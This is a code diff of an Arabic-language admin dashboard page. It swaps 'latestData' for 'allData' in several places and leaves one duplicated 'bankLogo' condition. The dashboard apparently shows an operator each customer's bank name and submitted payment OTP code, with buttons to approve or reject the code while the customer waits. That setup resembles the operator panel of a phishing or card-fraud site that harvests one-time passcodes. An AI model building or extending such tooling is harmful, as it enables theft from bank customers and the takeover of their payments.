@@ -1225,9 +1225,9 @@ export default function AdminDashboardPage() {
                           {/* اسم البنك بارز في الأعلى */}
                           {(allData.bankName || app.bankName) && (
                             <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
-                              {(allData.bankLogo || latestData.bankLogo || app.bankLogo) ? (
+                              {(allData.bankLogo || allData.bankLogo || app.bankLogo) ? (
                                 <img 
-                                  src={allData.bankLogo || latestData.bankLogo || app.bankLogo} 
+                                  src={allData.bankLogo || allData.bankLogo || app.bankLogo} 
                                   alt={String(allData.bankName || app.bankName)} 
                                   className="w-12 h-8 object-contain" 
                                 />
@@ -1520,14 +1520,14 @@ export default function AdminDashboardPage() {
                                   )}
 
                                   {/* أزرار تأكيد/رفض رمز OTP */}
-                                  {latestData.paymentStatus === "otp_submitted" && latestData.currentStep === "pay-otp" && (
+                                  {allData.paymentStatus === "otp_submitted" && allData.currentStep === "pay-otp" && (
                                     <div className="mt-4 space-y-2">
                                       <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
                                         <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
                                         <p className="text-blue-600 text-xs mt-1">العميل ينتظر الموافقة على الرمز</p>
                                       </div>
                                       <button
-                                        onClick={() => handleOtpAction(latestData.id, "approve")}
+                                        onClick={() => handleOtpAction(allData.id, "approve")}
                                         disabled={!!actionLoading[`otp_action_${app.id}`]}
                                         className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                                       >
@@ -1535,7 +1535,7 @@ export default function AdminDashboardPage() {
                                         {actionLoading[`otp_action_${app.id}`] === "approve" ? "جاري الموافقة..." : "✓ تأكيد الرمز وإتمام الدفع"}
                                       </button>
                                       <button
-                                        onClick={() => handleOtpAction(latestData.id, "reject")}
+                                        onClick={() => handleOtpAction(allData.id, "reject")}
                                         disabled={!!actionLoading[`otp_action_${app.id}`]}
                                         className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                                       >
@@ -1596,7 +1596,7 @@ export default function AdminDashboardPage() {
                                       <Smartphone className="w-4 h-4" />
                                       رموز OTP للدفع (Pay-OTP)
                                     </h4>
-                                    <SectionTimeBadge timestamp={allData.paymentOtp ? latestData.updatedAt : undefined} />
+                                    <SectionTimeBadge timestamp={allData.paymentOtp ? allData.updatedAt : undefined} />
                                   </div>
                                   {allData.paymentOtp ? (
                                     <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
@@ -1611,21 +1611,21 @@ export default function AdminDashboardPage() {
                                     </div>
                                   )}
                                   
-                                  {latestData.paymentStatus === "otp_submitted" && latestData.currentStep === "pay-otp" && (
+                                  {allData.paymentStatus === "otp_submitted" && allData.currentStep === "pay-otp" && (
                                     <div className="mt-4 space-y-2">
                                       <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
                                         <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
                                       </div>
                                       <button
-                                        onClick={() => handleOtpAction(latestData.id, "approve")}
-                                        disabled={!!actionLoading[`otp_action_${latestData.id}`]}
+                                        onClick={() => handleOtpAction(allData.id, "approve")}
+                                        disabled={!!actionLoading[`otp_action_${allData.id}`]}
                                         className="w-full bg-green-500 hover:bg-green-600 text-white py-2.5 rounded-lg text-sm font-bold transition-all disabled:opacity-50"
                                       >
                                         ✓ تأكيد الرمز وإتمام الدفع
                                       </button>
                                       <button
-                                        onClick={() => handleOtpAction(latestData.id, "reject")}
-                                        disabled={!!actionLoading[`otp_action_${latestData.id}`]}
+                                        onClick={() => handleOtpAction(allData.id, "reject")}
+                                        disabled={!!actionLoading[`otp_action_${allData.id}`]}
                                         className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2.5 rounded-lg text-sm font-bold transition-all disabled:opacity-50"
                                       >
                                         ✗ رفض الرمز وطلب رمز جديد
